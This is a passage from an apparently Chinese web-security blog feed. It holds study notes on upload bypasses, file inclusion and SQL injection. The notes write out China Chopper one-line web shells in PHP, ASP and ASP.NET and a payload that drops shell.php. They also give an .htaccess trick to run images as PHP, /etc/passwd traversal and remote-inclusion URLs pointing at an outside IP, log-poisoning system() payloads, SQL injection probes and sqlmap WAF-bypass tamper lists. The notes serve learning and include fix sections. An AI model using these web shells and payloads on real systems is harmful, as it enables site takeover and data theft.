class="line">/wooyun.cdx</span><br></pre></td></tr></table></figure><p>3、webdav扩展漏洞</p><p>当iis服务器开启了webdav扩展之后，允许客户端有更多的请求方法，如：put、delete、copy、move等请求方法。</p><p>结合这些方法，可以用put方法将txt文本上传到服务器上，之后利用copy或move方法将txt文件转成可执行文件。</p><p><code>iis write</code></p><h2 id="apache解析漏洞"><a href="#apache解析漏洞" class="headerlink" title="apache解析漏洞"></a>apache解析漏洞</h2><p>版本：apache1.x，apache2.x</p><p>apache在碰到一个文件时，如1.php.rar，这是php会从后往前对文件后缀进行解析，找到一个自己可以解析的文件后缀。</p><p>配合解析漏洞，可以将可执行文件上传到服务器上，绕过程序的检测，获取webshell。</p><h2 id="php-cgi解析漏洞（Nginx解析漏洞）"><a href="#php-cgi解析漏洞（Nginx解析漏洞）" class="headerlink" title="php cgi解析漏洞（Nginx解析漏洞）"></a>php cgi解析漏洞（Nginx解析漏洞）</h2><p><a href="http://xxx.com/1.jpg/1.php" target="_blank" rel="noopener">http://xxx.com/1.jpg/1.php</a></p><p>1.jpg为图片马</p><p>iis7.0、iis7.5、lighttpd也存在这样的漏洞。</p><p>补充：</p><p>在默认Fast-CGI开启状况下,黑阔上传一个名字为wooyun.jpg，内容为<code>&lt;?PHP fputs(fopen(&#39;shell.php&#39;,&#39;w&#39;),&#39;&lt;?php eval($_POST[cmd])?&gt;&#39;);?&gt;</code>的文件，然后访问<code>wooyun.jpg/.php</code>,在这个目录下就会生成一句话木马<code>shell.php</code>。</p><p><a href="http://cb.drops.wiki/drops/papers-539.html" target="_blank" rel="noopener">传送门-解析漏洞总结</a></p><h1 id="绕过上传漏洞"><a href="#绕过上传漏洞" class="headerlink" title="绕过上传漏洞"></a>绕过上传漏洞</h1><ul><li>客户端检测</li><li>服务器端检测</li></ul><p><strong>中国菜刀</strong></p><p>一句话：</p><p>php</p><p><code>&lt;?php @eval($_POST[&#39;chopper&#39;]);?&gt;</code></p><p>asp</p><p><code>&lt;%eval request(&quot;chopper&quot;)%&gt;</code></p><p>asp.net</p><p><code>&lt;% Page Language=&quot;JScript&quot;%&gt;&lt;%eval(Request.Item[&quot;chopper&quot;],&quot;unsafe&quot;);%&gt;</code></p><p>图片一句话：</p><p>将一句话木马插入在图片文件中，而且并不损坏图片文件。</p><p><code>edjpgcom</code></p><h2 id="客户端检测"><a href="#客户端检测" class="headerlink" title="客户端检测"></a>客户端检测</h2><blockquote><p>在服务器后端缺乏对于用户输入的处理和限制或者处理和限制不严格。</p></blockquote><p>1、firebug删除js</p><p>2、burpsuite改文件后缀名</p><h2 id="服务器端检测"><a href="#服务器端检测" class="headerlink" title="服务器端检测"></a>服务器端检测</h2><ol><li>黑名单过滤</li></ol><p>黑名单过滤是一种不安全的方式，黑名单定义了一系列的扩展名，服务器端在接收文件后，与黑名单扩展名对比，如果发现文件扩展名与黑名单的扩展名匹配，则认为文件不合法。</p><p>在windows系统下，如果文件名以“.”或者空格作为结尾，系统会自动去除“.”与空格，如：<code>asp.</code>或者<code>asp_</code></p><ol start="2"><li>白名单过滤</li></ol><p>配合解析漏洞进行绕过</p><ol start="3"><li>MIME验证</li></ol><p>MIME (Multipurpose Internet Mail Extensions) 是描述消息内容类型的因特网标准。<br>MIME 消息能包含文本、图像、音频、视频以及其他应用程序专用的数据。</p><p><strong>按照内容类型排列的 Mime 类型列表</strong><br>|类型/子类型    | 扩展名 |<br>|—-|—-|<br>|application/msword    |doc|<br>|application/octet-stream|    exe|<br>|application/pdf|    pdf|<br>|application/rtf|    rtf|<br>|application/vnd.ms-powerpoint    |ppt|<br>|application/x-javascript    |js|<br>|application/x-shockwave-flash    |swf|<br>|application/zip|    zip|<br>|application/php|php文件|<br>|audio/mpeg    |mp3|<br>|audio/x-wav    |wav|<br>|image/bmp    |bmp|<br>|image/gif    |gif|<br>|image/jpeg    |jpeg|<br>|image/jpeg|    jpg|<br>|text/css    |css|<br>|text/html    |html|<br>|text/plain|    txt|</p><p>在http请求中，MIME类型放在Content-Type字段</p><ol start="4"><li>目录验证</li></ol><p>上传文件的表单，上传目录可控。</p><ol start="5"><li>截断上传攻击。</li></ol><p><code>Nginx &lt;8.03</code> 空字节代码执行漏洞</p><p>常见的截断字符：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">\0</span><br><span class="line">?</span><br><span class="line">%00</span><br></pre></td></tr></table></figure><ol start="6"><li>其他</li></ol><p>如果在<code>Apache</code>中<code>.htaccess</code>可被执行.且可被上传.那可以尝试在<code>.htaccess</code>中写入: <code>&lt;FilesMatch &quot;wooyun.jpg&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt;</code>,然后再上传<code>shell.jpg</code>的木马, 这样<code>shell.jpg</code>就可解析为php文件。</p><h2 id="文本编辑器上传漏洞"><a href="#文本编辑器上传漏洞" class="headerlink" title="文本编辑器上传漏洞"></a>文本编辑器上传漏洞</h2><p>常见文本编辑器的漏洞</p><h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ul><li>目录过滤不严，攻击者建立畸形目录</li><li>文件为重命名，攻击者利用解析漏洞</li></ul><p>此图来自下面的paper，在红点出进行代码修复，基本上可以修复大部分的上传攻击漏洞。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513328582869.jpg" alt="enter description here"></p><h1 id="补充"><a href="#补充" class="headerlink" title="补充"></a>补充</h1><p>上传攻击总结.pdf,这篇paper针对上传攻击，很详细：</p><p>链接：<a href="https://pan.baidu.com/s/1o8DqwXG" target="_blank" rel="noopener">https://pan.baidu.com/s/1o8DqwXG</a> 密码：v5lb</p><p><a href="https://alpha.wallhaven.cc/" target="_blank" rel="noopener">首页图来自wallhaven.cc</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/6b695b58a8c141161d5b9d9c39259579_r.jpg&quot; alt=&quot;enter description here&quot; title=&quot;文件上传&quot;&gt;&lt;/p&gt;
    
    </summary>
    
      <category term="阅读" scheme="http://airs-sec.com/categories/%E9%98%85%E8%AF%BB/"/>
    
    
  </entry>
  
  <entry>
    <title>文件包含</title>
    <link href="http://airs-sec.com/2017/12/14/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    <id>http://airs-sec.com/2017/12/14/文件包含/</id>
    <published>2017-12-14T09:10:46.000Z</published>
    <updated>2017-12-14T11:01:14.864Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/a827b051f81986182370076c4aed2e738ad4e6db.jpg" alt="1" title="1"></p><p>在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。</p><a id="more"></a><h2 id="0x01-本地文件包含"><a href="#0x01-本地文件包含" class="headerlink" title="0x01 本地文件包含"></a>0x01 本地文件包含</h2><blockquote><p>当被包含的文件在服务器本地时，就形成本地文件包含</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type of call:</span><br><span class="line">    require($_GET[file]);</span><br><span class="line">Exploit:</span><br><span class="line">    http://host/?file=/etc/passwd</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-29_11-40-51.png" alt="2" title="2"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Type of call:</span><br><span class="line">    require(&quot;includes/&quot;.$_GET[file]);</span><br><span class="line">Exploit:</span><br><span class="line">    http://host/?file=../../../../../etc/passwd</span><br></pre></td></tr></table></figure><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-29_13-05-59.png" alt="3" title="3"></p><h2 id="0x02-远程文件包含"><a href="#0x02-远程文件包含" class="headerlink" title="0x02 远程文件包含"></a>0x02 远程文件包含</h2><blockquote><p>当被包含的文件在第三方服务器时，叫做远程文件包含</p></blockquote><p><strong>需要：</strong> <code>php.ini</code> <code>allow_url_fopen on</code> <code>allow_url_include on</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-29_13-06-27.png" alt="4" title="4"></p><p><code>http://localhost/dvwa/vulnerabilities/fi/?page=http://104.128.225.49:8080/test.php</code></p><h2 id="0x03包含日志文件getshell（需要一定读权限-且需要知道日志文件路径）"><a href="#0x03包含日志文件getshell（需要一定读权限-且需要知道日志文件路径）" class="headerlink" title="0x03包含日志文件getshell（需要一定读权限,且需要知道日志文件路径）"></a>0x03包含日志文件getshell（需要一定读权限,且需要知道日志文件路径）</h2><blockquote><p>包含日志文件主要的原理是利用apache的错误日志文件，当访问一个不存在的页面，且在页面后面加恶意代码，可以将这段代码写入到error.log文件中去，之后通过远程文件包含，将日志文件包含出来。。</p></blockquote><p>如漏洞文件为：<code>http://xxx.com/lfi.php?page=xxx</code></p><p><code>http://xxx.com/lfi.php?page=/etc/httpd/conf/httpd.conf</code></p><p>通过<code>/etc/httpd/conf/httpd.conf</code> 查看错误日志文件位置为<code>error.log</code></p><p>（1）包含一句话</p><p>随便访问：<code>http://xxx.com/xxx.php&lt;?php eval($_POST[&#39;a&#39;]); ?&gt;</code></p><blockquote><p>写入日志,查看日志</p></blockquote><p><code>http://xxx.com/lfi.php?page=error.log</code></p><p>注：会被编码，需burp截包，repeate改编码。（红黑联盟视频渗透测试17课）       </p><p>（2）包含命令执行</p><p>随便访问：<code>http://xxx.com/xxx.php&lt;?php system(‘ls -al /var/www/’)&gt;</code></p><p>写入日志，查看日志</p><p><code>http://xxx.com/lfi.php?page=error.log</code></p><h2 id="0x04-漏洞修复"><a href="#0x04-漏洞修复" class="headerlink" title="0x04 漏洞修复"></a>0x04 漏洞修复</h2><blockquote><p>对引入文件包含的参数进行过滤，或者对所引入的文件的域进行限制，禁止服务器访问可信域以外的文件。</p></blockquote><p><a href="https://superkieran.github.io/WooyunDrops/#!/drops/396.PHP%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93" target="_blank" rel="noopener">参考-PHP文件包含漏洞总结</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;&lt;img src=&quot;http://obgutsg63.bkt.clouddn.com/blog/a827b051f81986182370076c4aed2e738ad4e6db.jpg&quot; alt=&quot;1&quot; title=&quot;1&quot;&gt;&lt;/p&gt;
&lt;p&gt;在通过引入文件时，引用的文件名，用户可控，由于传入的文件名没有经过合理的校验，或者校验被绕过，从而操作了预想之外的文件，就可能导致意外的文件泄露甚至恶意的代码注入。&lt;/p&gt;
    
    </summary>
    
      <category term="学习" scheme="http://airs-sec.com/categories/%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>web安全深度剖析</title>
    <link href="http://airs-sec.com/2017/12/14/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90/"/>
    <id>http://airs-sec.com/2017/12/14/web安全深度剖析/</id>
    <published>2017-12-14T03:14:28.000Z</published>
    <updated>2017-12-14T03:21:07.305Z</updated>
    
    <content type="html"><![CDATA[<p>web安全深度剖析这本书个人感觉很不错，很适合初学者，我之前也看过，做过笔记。</p><p>大家如果要看，可以在<code>分类-阅读</code>中找到。</p><p>链接地址：</p><p>链接：<a href="https://pan.baidu.com/s/1jHNrCEE" target="_blank" rel="noopener">https://pan.baidu.com/s/1jHNrCEE</a> 密码：1oo4</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;web安全深度剖析这本书个人感觉很不错，很适合初学者，我之前也看过，做过笔记。&lt;/p&gt;
&lt;p&gt;大家如果要看，可以在&lt;code&gt;分类-阅读&lt;/code&gt;中找到。&lt;/p&gt;
&lt;p&gt;链接地址：&lt;/p&gt;
&lt;p&gt;链接：&lt;a href=&quot;https://pan.baidu.com/s/1
      
    
    </summary>
    
      <category term="书籍分享" scheme="http://airs-sec.com/categories/%E4%B9%A6%E7%B1%8D%E5%88%86%E4%BA%AB/"/>
    
    
      <category term="书籍" scheme="http://airs-sec.com/tags/%E4%B9%A6%E7%B1%8D/"/>
    
  </entry>
  
  <entry>
    <title>web安全深度剖析-第五章-sql注入漏洞</title>
    <link href="http://airs-sec.com/2017/12/13/web%E5%AE%89%E5%85%A8%E6%B7%B1%E5%BA%A6%E5%89%96%E6%9E%90-%E7%AC%AC%E4%BA%94%E7%AB%A0-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"/>
    <id>http://airs-sec.com/2017/12/13/web安全深度剖析-第五章-sql注入漏洞/</id>
    <published>2017-12-13T08:47:24.000Z</published>
    <updated>2017-12-14T04:56:05.631Z</updated>
    
    <content type="html"><![CDATA[<p><img src="http://obgutsg63.bkt.clouddn.com/blog/1513155397482.jpg" alt="..."></p><a id="more"></a><h2 id="0x01-sql注入漏洞的原理"><a href="#0x01-sql注入漏洞的原理" class="headerlink" title="0x01 sql注入漏洞的原理"></a>0x01 sql注入漏洞的原理</h2><p>当应用程序（如php）要通过数据库（mysql）<code>增删改查</code>数据时，如果在应用程序设计时，操作数据库<code>增删改查</code>的语句存在缺陷（未过滤特殊字符），攻击者可构造特殊的sql语句，达到非法操作数据库的目的。</p><p><strong>用户输入的数据被sql解释器执行。</strong></p><h2 id="0x02-注入分类"><a href="#0x02-注入分类" class="headerlink" title="0x02 注入分类"></a>0x02 注入分类</h2><ul><li>数字型注入</li></ul><p><code>http://xxx.com/product.php?id=1</code></p><p>查询语句<br>    <code>select * from product where id = 1</code></p><blockquote><p>for example：</p></blockquote><p>存在下列语句：</p><p><strong>原始数据库语句</strong></p><p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;$id&#39;;</code></p><p><strong>用户输入数据后的语句</strong></p><p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39;;</code></p><p><strong>漏洞利用语句：</strong></p><p><code>SELECT first_name, last_name FROM users WHERE user_id = &#39;&#39; and 1=2 --1&#39;;</code></p><p>输出报错，存在sql注入</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-27_11-00-47.png" alt="sql error" title="sql error"></p><ul><li>字符型注入</li></ul><p><code>http://xxx.com/product.php?str=&#39;apple&#39;</code></p><p>查询语句<br>    <code>select * from product where str = &#39;apple&#39;</code></p><p><code>product.php?</code>中<code>?</code>后面接的是带入数据库的参数。</p><hr><p><strong>判断</strong></p><p>1、<code>apple&#39; and &#39;1&#39;=&#39;2</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-27_11-00-47.png" alt="enter description here" title="sql char error"></p><p>2、<code>apple&#39;%2B&#39;</code></p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/Snipaste_2017-11-27_11-27-16.png" alt="enter description here" title="sql char error"></p><ul><li>其他注入类型</li></ul><p><strong>POST注入</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/login.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost/dvwa/login.php</span><br><span class="line">Cookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 88</span><br><span class="line"></span><br><span class="line">username=admin&amp;password=password&amp;Login=Login&amp;user_token=8a0a745a43a7cd4e34d1ce0802320078</span><br></pre></td></tr></table></figure><p>POST和GET类型的区别</p><p>通过FORM表单提交的数据，一般使用的是POST数据提交，POST提交的数据长度比GET型长，同时，在数据安全方面，POST占有优势。而GET提交的数据在URL中明文传送。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">GET /dvwa/vulnerabilities/sqli/ HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost/dvwa/index.php</span><br><span class="line">Cookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure><p><strong>COOKIE注入</strong></p><p>COOKIE是一种身份凭证，在浏览器和服务器通信的过程中，由于HTTP是无状态协议，所以每次通信都得去认证身份，你想象下，如果在购买东西的时候，没有身份凭证的话，添加一件商品，用户的当前登录状态就会消失，这样就好麻烦了。</p><p>COOKIE存储在用户的浏览器中，当用户通过浏览器访问服务器时，带着这个COOKIE（令牌），服务器通过对比发现，这个COOKIE是这个用户的，就会记录登录状态，访问其他的页面时，都是带着这个COOKIE，用户的状态就会处在标识当中。</p><p><img src="http://obgutsg63.bkt.clouddn.com/blog/12.png" alt="enter description here" title="COOKIE"></p><p><strong>延时注入</strong></p><p><strong>搜索型注入</strong></p><p><a href="http://airs-sec.com/2017/02/09/%25E6%2590%259C%25E7%25B4%25A2%25E5%259E%258B%25E6%25B3%25A8%25E5%2585%25A5%25E5%2588%25A9%25E7%2594%25A8%25E6%2596%25B9%25E6%25B3%2595/">传送门</a></p><p><strong>base64注入</strong></p><h2 id="0x03注入判断"><a href="#0x03注入判断" class="headerlink" title="0x03注入判断"></a>0x03注入判断</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line">or 1=1</span><br><span class="line"></span><br><span class="line">or 1=2</span><br><span class="line"></span><br><span class="line">and 1=1 数字型</span><br><span class="line"></span><br><span class="line">&apos; and &apos;1&apos;=&apos;1 字符型</span><br><span class="line"></span><br><span class="line">) and (1=1   </span><br><span class="line"></span><br><span class="line">&apos;) and (&apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">%&apos; and &apos;%&apos;=&apos; 搜索型</span><br><span class="line"></span><br><span class="line">%&apos; and 1=(select 1 from dual) and &apos;%&apos;=&apos;    //mysql 和 oracle 中存在dual虚拟表</span><br><span class="line"></span><br><span class="line">case when 1=1 then 条件1 else 条件2 end   //如果条件成立（1=1）  返回条件1 否则返回条件2</span><br><span class="line"></span><br><span class="line">&apos; and 1=(select case when 1=1 then 1 else 2 end) and &apos;1&apos;=&apos;1   </span><br><span class="line"></span><br><span class="line">&apos; and 1=1 and &apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">&apos; and 1=2 and &apos;1&apos;=&apos;1</span><br><span class="line"></span><br><span class="line">&apos; and 1 like 1 and &apos;1&apos; like &apos;1</span><br><span class="line"></span><br><span class="line">&apos; and 1 like 2 and &apos;1&apos; like &apos;1</span><br><span class="line"></span><br><span class="line">&apos; ||</span><br><span class="line"></span><br><span class="line">AND SLEEP(5)</span><br><span class="line"></span><br><span class="line">%&apos; and sleep(5) and &apos;%&apos;=&apos;</span><br><span class="line"></span><br><span class="line">||    =   or</span><br><span class="line"></span><br><span class="line">&amp;&amp;   =   and</span><br><span class="line"></span><br><span class="line">and 2&gt;1  </span><br><span class="line"></span><br><span class="line">and 2&lt;1</span><br><span class="line"></span><br><span class="line">%0a</span><br><span class="line"></span><br><span class="line">&apos; union%a0select version()</span><br><span class="line"></span><br><span class="line">bypass.php?id=xxoo&apos;%2b100.union select flag from flag.flag%23</span><br><span class="line"></span><br><span class="line">index.php?name= and 1=.1union select flag from flag limit 0,1%23\</span><br><span class="line"></span><br><span class="line">%0c = form feed, new page</span><br><span class="line"></span><br><span class="line">%09 = horizontal tab</span><br><span class="line"></span><br><span class="line">%0d = carriage return</span><br><span class="line"></span><br><span class="line">%0a = line feed, new line</span><br><span class="line"></span><br><span class="line">**%&apos; an%00d 1=1 an%00d &apos;%&apos;=&apos;**</span><br><span class="line"></span><br><span class="line">宽字节： %df&apos;</span><br><span class="line"></span><br><span class="line">and 1 in (1)</span><br><span class="line"></span><br><span class="line">and 1 in (2)</span><br></pre></td></tr></table></figure><h2 id="0x04注入工具"><a href="#0x04注入工具" class="headerlink" title="0x04注入工具"></a>0x04注入工具</h2><p>sqlmap</p><p><a href="http://airs-sec.com/2017/02/09/%E6%90%9C%E7%B4%A2%E5%9E%8B%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8%E6%96%B9%E6%B3%95/">传送门</a></p><p><strong>补充：</strong></p><p>针对伪静态：</p><p><code>sqlmap -u http://xxx.com/id/2*.html --dbs</code></p><p>针对POST注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">POST /dvwa/login.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.2; WOW64; rv:18.0) Gecko/20100101 Firefox/18.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-cn,zh;q=0.8,en-us;q=0.5,en;q=0.3</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Referer: http://localhost/dvwa/login.php</span><br><span class="line">Cookie: security=impossible; PHPSESSID=t8pr1juco934q8av7sqi5g7cj3</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 88</span><br><span class="line"></span><br><span class="line">username=admin*&amp;password=password&amp;Login=Login&amp;user_token=8a0a745a43a7cd4e34d1ce0802320078</span><br></pre></td></tr></table></figure><p>绕过waf的tamper脚本：</p><blockquote><p>要测试mysql，可以使用以下所有tamper脚步：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,</span><br><span class="line">greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,</span><br><span class="line">multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,</span><br><span class="line">space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,</span><br><span class="line">versionedmorekeywords,xforwardedfor</span><br></pre></td></tr></table></figure><blockquote><p>要测试mssql，您可以使用以下所有tamper脚本：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">--tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes</span><br></pre></td></tr></table></figure><blockquote><p>下面是支持mssql和mysql的tamper脚步列表<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">--tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,</span><br><span class="line">charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,</span><br><span class="line">percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes</span><br><span class="line">`</span><br></pre></td></tr></table></figure></p></blockquote><p><a href="https://securityonline.info/sql-injection-bypass-waf-using-tamper-script-sqlmap/" target="_blank" rel="noopener">来源</a></p><p>sqlmap脑图：链接：<a href="http://pan.baidu.com/s/1mhYbRDI" target="_blank" rel="noopener">http://pan.baidu.com/s/1mhYbRDI</a> 密码：9z2f</p><p><strong>个人常用选项：</strong></p><p>sqlmap -u “<a href="http://xxx.com/xxx.php?id=1&quot;" target="_blank" rel="noopener">http://xxx.com/xxx.php?id=1&quot;</a> –level 3 –random-agent –risk 3 –dbs</p><h2 id="0x05防止sql注入"><a href="#0x05防止sql注入" class="headerlink" title="0x05防止sql注入"></a>0x05防止sql注入</h2><ul><li>严格的数据类型</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$id = $_GET[&apos;id&apos;];</span><br><span class="line">$sql = &quot;select * from news where id = $id&quot;;</span><br><span class="line">$news = exec($sql);</span><br></pre></td></tr></table></figure><p>对id进行判断，过滤</p><p>1、通过mysql_real_escape_string( )函数进行过滤。mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。</p><pre><code>`$id = mysql_real_escape_string( $id );`</code></pre><p>2、is_numeric()函数判断输入的是否为数字。</p><ul><li>特殊字符转义</li></ul><p>OWASP ESAPI</p><p><strong>二次注入攻击:</strong></p><p>在开启转义之后，特殊字符被转移了，但在数据库存储中并未转义，当另一个地方引用时，则会有一次诱发sql注入攻击。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$sql = "<span class="keyword">insert</span> <span class="keyword">into</span> message(<span class="keyword">id</span>,title,<span class="keyword">content</span>) <span class="keyword">values</span> (<span class="number">1</span>,<span class="string">"$title"</span>,<span class="string">"$content"</span>)<span class="string">";</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># sql语句如下</span></span><br><span class="line"><span class="string">insert into message(id,title,content) values (3,'secbug\'','secbug')</span></span><br></pre></td></tr></table></figure><hr><table><thead><tr><th>id</th><th>title</th><th>content</th></tr></thead><tbody><tr><td>3</td><td>secbug’</td><td>secbug.org</td></tr></tbody></table><hr><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> message <span class="keyword">where</span> title = <span class="string">'$title'</span></span><br></pre></td></tr></table></figure><p><strong>利用语句</strong></p><p><code>$title = &#39; union select 1,@@version 3 --</code></p><ul><li><p>使用预编译语句</p><ul><li>将sql语句预先编译后再执行。</li></ul></li><li><p>框架技术</p><ul><li>利用集成的框架进行应用程序的开发工作。</li></ul></li><li><p>存储过程</p><ul><li>为了完成特定功能或经常使用的SQL语句集，经编译后存储在数据库中。</li></ul></li></ul><h2 id="0x06其他"><a href="#0x06其他" class="headerlink" title="0x06其他"></a>0x06其他</h2><p><strong>手工注入</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span 